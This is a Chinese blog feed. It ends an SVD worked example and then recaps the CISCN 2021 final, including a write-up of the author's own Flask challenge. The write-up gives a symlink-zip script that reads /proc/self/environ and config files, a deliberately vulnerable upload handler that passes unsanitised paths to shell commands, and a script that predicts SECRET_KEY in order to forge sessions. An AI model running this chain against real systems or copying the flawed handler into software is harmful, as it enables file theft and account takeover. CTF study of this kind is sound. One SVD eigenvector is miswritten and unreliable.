的所有特征向量张成一个m×m的矩阵U，这就是U矩阵了，U矩阵里的每个特征向量叫做A的左奇异向量</p><p>现在就差W矩阵了</p><p>因为有</p><p>$A=UWV^T=&gt;AV=UWVTV=&gt;AV=UW=&gt;Av_i=\sigma_iu_i=&gt;\sigma_i=Av_i/u_i$</p><p>通过这个我们可以求得每个奇异值的值，进而可以求奇异值矩阵W</p><p>下面补充对于为什么$A^TA$的特征向量组成的就是我们SVD中的V矩阵，而$AA^T$的特征向量组成的就是我们SVD中的U矩阵</p><p>下面以V矩阵的证明为例子</p><p>$A=UWV^T=&gt;A^T=VWU^T=&gt;A^TA=VWU^TUWV^T=VW^2V^T$</p><p>得证</p><h2 id="SVD例题"><a href="#SVD例题" class="headerlink" title="SVD例题"></a>SVD例题</h2><p>对A=$\left[ \begin{matrix} 0 &amp; 1 \\ 1 &amp;1  \\ 1&amp;0  \end{matrix} \right]$</p><p>先求$A^TA$和$AA^T$</p><p>$A^TA=\left[ \begin{matrix} 0 &amp; 1 &amp; 1 \\ 1 &amp;1 &amp; 0   \end{matrix} \right]\left[ \begin{matrix} 0 &amp; 1  \\ 1 &amp;1 \\ 1&amp;0   \end{matrix} \right]=\left[ \begin{matrix} 2 &amp; 1  \\ 1 &amp;2   \end{matrix} \right]$</p><p>$AA^T=\left[ \begin{matrix} 0 &amp; 1  \\ 1 &amp;1 \\1&amp;0  \end{matrix} \right]\left[ \begin{matrix} 0 &amp; 1&amp;1  \\ 1 &amp;1&amp;0   \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 1&amp;0  \\ 1 &amp;2&amp;1\\0&amp;1&amp;1   \end{matrix} \right]$</p><p>进而求得$A^TA$的特征值和特征向量</p><p>$\lambda_1=3;v_1=\left[ \begin{matrix} 1/\sqrt2  \\ 1 &amp;2&amp;1\\0&amp;1&amp;1   \end{matrix} \right]$ $\lambda_2=1;v_2=\left[ \begin{matrix} -1/\sqrt2  \\ 1/\sqrt2   \end{matrix} \right]$</p><p>接着求$AA^T$的特征值和特征向量</p><p>$\lambda_1=3;u_1=\left[ \begin{matrix} 1/\sqrt6  \\ 2/\sqrt6\\1/\sqrt6   \end{matrix} \right]$ $\lambda_2=1;u_2=\left[ \begin{matrix} 1/\sqrt2  \\ 0\\-1/\sqrt2   \end{matrix} \right]$ $\lambda_3=0;u_3=\left[ \begin{matrix} 1/\sqrt3  \\ -1/\sqrt3\\1/\sqrt3   \end{matrix} \right]$</p><p>通过$Av_i=\sigma_iu_i,i=1,2$求奇异值</p><p>$\left[ \begin{matrix} 0&amp;1  \\ 1&amp;1\\1&amp;0   \end{matrix} \right]\left[ \begin{matrix} 1\sqrt2  \\ 1\sqrt2   \end{matrix} \right]=\sigma_1\left[ \begin{matrix} 1/\sqrt6  \\ 2/\sqrt6\\1/\sqrt6   \end{matrix} \right]=&gt;\sigma_1=\sqrt3$</p><p>$\left[ \begin{matrix} 0&amp;1  \\ 1&amp;1\\1&amp;0   \end{matrix} \right]\left[ \begin{matrix} -1\sqrt2  \\ 1\sqrt2   \end{matrix} \right]=\sigma_2\left[ \begin{matrix} 1/\sqrt2  \\ 0\\-1/\sqrt2   \end{matrix} \right]=&gt;\sigma_2=1$</p><p>也可以用 [公式] 直接求出奇异值为 [公式] 和1.</p><p>最终完成svd分解为</p><p>$A=UWV^T=\left[ \begin{matrix} 1/\sqrt6 &amp; 1\sqrt2&amp;1/\sqrt3  \\ 2/\sqrt6&amp;0&amp;-1/\sqrt3\\1/\sqrt6&amp;-1/\sqrt2&amp;1/\sqrt3   \end{matrix} \right]\left[ \begin{matrix} \sqrt3&amp;0  \\ 0&amp;1\\0&amp;0   \end{matrix} \right]\left[ \begin{matrix} 1/\sqrt2&amp;1/\sqrt2  \\ -1/\sqrt2&amp;1/\sqrt2   \end{matrix} \right]$</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;矩阵求逆的几种方法&quot;&gt;&lt;a href=&quot;#矩阵求逆的几种方法&quot; class=&quot;headerlink&quot; title=&quot;矩阵求逆的几种方法&quot;&gt;&lt;/a&gt;矩阵求逆的几种方法&lt;/h1&gt;&lt;p&gt;在学习Hill算法的过程中，突然意识到自己对矩阵的很多东西都已经还给老师，于是打算把</summary>
      
    
    
    
    <category term="基础学习" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="线性代数" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"/>
    
    
    <category term="矩阵" scheme="http://www.fxizenta.design/tags/%E7%9F%A9%E9%98%B5/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn决赛总结</title>
    <link href="http://www.fxizenta.design/2021/07/19/ciscn2021final/"/>
    <id>http://www.fxizenta.design/2021/07/19/ciscn2021final/</id>
    <published>2021-07-18T23:14:21.000Z</published>
    <updated>2021-07-23T09:06:06.369Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN2021决赛总结"><a href="#CISCN2021决赛总结" class="headerlink" title="CISCN2021决赛总结"></a>CISCN2021决赛总结</h1><p>算是队伍主力师兄全部毕业，加上18级队员相对断层情况之后的第一场线下赛，同时也是我参加的第一场awd赛制的比赛，在经验还是远远不足的，也导致这次awd阶段失分严重，尤其是web2的题目完全是一个失守的阶段，被各位师傅们留下了一堆后面，同时还不知道怎么彻底删除，经验还是远远不足，所以写下本文来总结在这次线下赛中队伍所暴露的问题，以及在未来的比赛中可以做的更好的地方。</p><h2 id="awd阶段"><a href="#awd阶段" class="headerlink" title="awd阶段"></a>awd阶段</h2><h3 id="开局阶段"><a href="#开局阶段" class="headerlink" title="开局阶段"></a>开局阶段</h3><p>开局的最基本的操作，下面是我们队伍做出的操作</p><ul><li>dump下源码</li><li>改数据库密码</li><li>dump数据库</li><li>尝试上weblogger</li><li>将源码用D盾扫一遍先</li></ul><h3 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h3><p>这次比赛由于没有经验，许多操作实在太过不熟练，几乎没有多少时间哪来阅读源码，尤其因为web1和web2题完全失守的情况，大多时候都在焦头烂额的想办法在过check的前提下进行防守，好几次因为防守姿势不恰当而没通过check导致扣分，废了，于是，在进攻方面比赛就变成了根据流量抄答案，然后写脚本进行自动化。</p><p>不过这次比赛犯了一个很大的错误，一开始因为抄作业抄的比较快的愿意（哈哈哈哈哈哈硬是打成了铁三，进攻全程看流量），排名还是比较靠前的，但是由于没有第一时间选择自动化脚本而导致前面宝贵的几轮没能够打完全部没有进行修复的靶机，同时还有就是太过执着于web1，导致web2流量出来好几轮之后才去看，导致了队伍少了一个题的攻击得分，这些都是非常致命的错误，归根到底感觉还是在比赛的时候思路不够清晰，动作太慢了。</p><h3 id="防守阶段"><a href="#防守阶段" class="headerlink" title="防守阶段"></a>防守阶段</h3><p>防守阶段对于不死马则是选择kill进程，和想办法写个不断删后门的脚本进行条件竞争，但是由于自身太菜代码能力低下，条件竞争的脚本到web1下了都还没写出来，太菜了，废了，还得加强一下很久没有提升的代码能力了。web3则主要的应对手段是把用于读flag的图片直接删了，但是这里我犯了一个致命的错误，我只是把我最先看到打我们容器的大佬那个路径下面的四个图片删了，完全没有对所有可以利用的其他路径下的图片进行检查，导致可能有超过十轮以上的时候，我们那题都是失守状况，在比赛离结束还2小时的时候才发现自己这个致命的错误，导致多了很多不该的失分，同时也没能及时通过这个容易遗漏的点多打几个也没注意的这个问题的师傅的靶机几轮，亏死了，哭了。</p><h2 id="build阶段"><a href="#build阶段" class="headerlink" title="build阶段"></a>build阶段</h2><h3 id="题目的选取"><a href="#题目的选取" class="headerlink" title="题目的选取"></a>题目的选取</h3><p>选取了flask框架下的session伪造，也算是常见考点了，比较</p><h3 id="考点的设计"><a href="#考点的设计" class="headerlink" title="考点的设计"></a>考点的设计</h3><p>1、敏感信息泄露<br>2、Flask Session机制<br>3、伪随机数</p><p>哈哈哈哈哈没想到最后题目居然被选上了，然后被20多个师傅打穿了，也看到有师傅在那吐槽python版本的问题了，哈哈哈哈哈确实是因为随机数的愿意所以必须得用python3，这里确实有点小坑。</p><h3 id="check脚本"><a href="#check脚本" class="headerlink" title="check脚本"></a>check脚本</h3><p>check</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=sys.argv[<span class="number">2</span>]</span><br><span class="line">url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(port)+<span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    link(file_name)</span><br><span class="line">    files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">    <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">    os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">    content=s.get(url).text</span><br><span class="line">    <span class="keyword">if</span> content.find(<span class="string">&quot;I will tell you a secret, but you should become admin first.&quot;</span>)==-<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;(0, error1)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tmp&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;gjklawegklwjgklajgwl&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = <span class="string">&quot;tmp&quot;</span>, output = <span class="string">&quot;tmp&quot;</span>))</span><br><span class="line">    tmp=s.post(url+<span class="string">&#x27;upload&#x27;</span>, files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;tmp.zip&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;).text</span><br><span class="line">    print(tmp)</span><br><span class="line">    <span class="keyword">if</span> tmp!= <span class="string">&quot;gjklawegklwjgklajgwl&quot;</span>:</span><br><span class="line">        print(<span class="string">&#x27;(0, error2)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">        <span class="comment">#t=re.search(&#x27;gwekgwegwg=(.*?)\x00&#x27;, en).group(1)</span></span><br><span class="line">        <span class="comment">#print(t)</span></span><br><span class="line">        ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">        pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">        ini = read_file(ini)</span><br><span class="line">        source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;(1, Vulns)&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">&#x27;(0, error3)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>进入题目发现一个上传点和提示“I will tell you a secret, but you should become admin first.”，根据提示可以猜想到得先想办法以admin身份登录，查看cookie可以看到session，值为疑似base64的一串字符串，decode之后为类似{“username”:”2333”}的信息，可以猜到使用的是securecookie机制，如果能够得到签名的key和签名方法等相关信息就能想办法伪造session，没猜到也没关系，接下来的思路是一样的，就是想办法先拿到源码。</p><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>测试上传点，发现只能上传zip文件，并返回zip解压后的文件内容。尝试压缩软链接上传，发现会回显对应的文件内容，这样就实现了一个任意文件下载，通过这个可以开始想办法找到源码的路径，并且应该也已经找到了做题思路， 我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。 </p><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>接下来主要目标是获取源码</p><p>如果对linux比较了解应该会知道 <code>/proc</code>目录 ，然后通过 <code>/proc/self/environ</code>的软链接 来获得flask的环境变量，环境变量中可以找到配置文件路径和一些信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME&#x3D;uwsgi</span><br><span class="line">HOSTNAME&#x3D;5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;20.1</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0</span><br><span class="line">UWSGI_PROCESSES&#x3D;16</span><br><span class="line">STATIC_URL&#x3D;&#x2F;static</span><br><span class="line">PYTHON_GET_PIP_URL&#x3D;https:&#x2F;&#x2F;github.com&#x2F;pypa&#x2F;get-pip&#x2F;raw&#x2F;1fe530e9e3d800be94e04f6428460fc4fb94f5a9&#x2F;get-pip.pyUWSGI_CHEAPER&#x3D;2PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binLANG&#x3D;C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED&#x3D;1</span><br><span class="line">PYTHON_VERSION&#x3D;3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;auto</span><br><span class="line">SUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME&#x3D;uwsgi</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">STATIC_INDEX&#x3D;0</span><br><span class="line">PWD&#x3D;&#x2F;app&#x2F;y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256&#x3D;ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;static</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">UWSGI_RELOADS&#x3D;0</span><br></pre></td></tr></table></figure><p> 扫一眼过去，能够发现一项<code>UWSGI_INI</code>，以INI结尾，应该是个配置文件 ，而且从命名来看</p><p>”y0u_found_it.ini“已经在提示这个ini文件有问题，那么接下来 构造软链接，生成zip，上传读取。<br>得到<code>/app/ y0u_found_it.ini</code>内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module &#x3D; y0u_found_it.y0u_found_it_main</span><br><span class="line">callable&#x3D;app</span><br></pre></td></tr></table></figure><p>这样就找到了源代码路径<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>接下来获取源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p>查看代码发现secret=secret.secret，可以知道flag应该是在<code>secret.py</code>文件里，如果软链接直接读取 ，发现还是提示<code>you are not admin</code> ，所以还是得按照前面的分析 通过找<code>SECRET_KEY</code> 来解决，因为 python random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的。 </p><p>查看代码可知通过<code>uuid.getnode()</code>函数 获取网卡mac地址并转换成十进制数返回 ，那么思路就变成了先获取服务器的网卡mac地址来确定种子，进而确定<code>SECRET_KEY</code>，从而伪造<code>session</code> </p><p> 因为linux中一切都是文件，所以可以通过读<code>/sys/class/net/eth0/address</code>文件得到mac地址</p><p>然后 把mac地址处理下，转换成10进制，然后设置成seed，生成 <code>SECRET_KEY</code>，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><p>接下来就是通过key获取admin的session，可以通过flask-session-cookie-manager脚本也可以</p><p>自己搭个简单的flask环境来获得session值，然后可以通过bp改包等等方式修改session值得到flag</p><h3 id="镜像的打包"><a href="#镜像的打包" class="headerlink" title="镜像的打包"></a>镜像的打包</h3><p>没啥好说的，save一下，这次犯了个错误是一开始打包成tar，而官方要求是tar.gz导致队友导入的时候没导入进去</p><h2 id="break-amp-fix阶段"><a href="#break-amp-fix阶段" class="headerlink" title="break&amp;fix阶段"></a>break&amp;fix阶段</h2><h3 id="break阶段"><a href="#break阶段" class="headerlink" title="break阶段"></a>break阶段</h3><p>0解，太菜了，等官方wp之后再看看复现更新补充一下</p><h3 id="fix阶段"><a href="#fix阶段" class="headerlink" 